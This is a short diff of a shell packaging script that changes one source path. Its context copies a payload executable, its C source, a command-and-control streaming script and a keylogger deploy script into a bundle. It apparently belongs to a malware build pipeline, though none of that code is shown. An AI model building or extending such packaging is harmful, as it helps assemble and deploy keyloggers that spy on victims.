@@ -117,7 +117,7 @@ fi
 # Copy artifacts into package
 cp "$PAYLOAD" "$PKG_DIR/payload.exe" 2>/dev/null || true
 [ -f "${PAYLOAD%.exe}.c" ] && cp "${PAYLOAD%.exe}.c" "$PKG_DIR/source.c" 2>/dev/null || true
-[ -f "${PROJECT_DIR}/results/malware_source.c" ] && cp "${PROJECT_DIR}/results/malware_source.c" "$PKG_DIR/source.c" 2>/dev/null || true
+[ -f "${PROJECT_DIR}/results/latest/source.c" ] && cp "${PROJECT_DIR}/results/latest/source.c" "$PKG_DIR/source.c" 2>/dev/null || true
 cp "$SCRIPT_DIR/c2_stream.py" "$PKG_DIR/" 2>/dev/null || true
 cp "${PROJECT_DIR}/scripts/deploy_keylogger.sh" "$PKG_DIR/deploy.sh" 2>/dev/null && chmod +x "$PKG_DIR/deploy.sh" || true
 rm -f "${PROJECT_DIR}/results/latest"
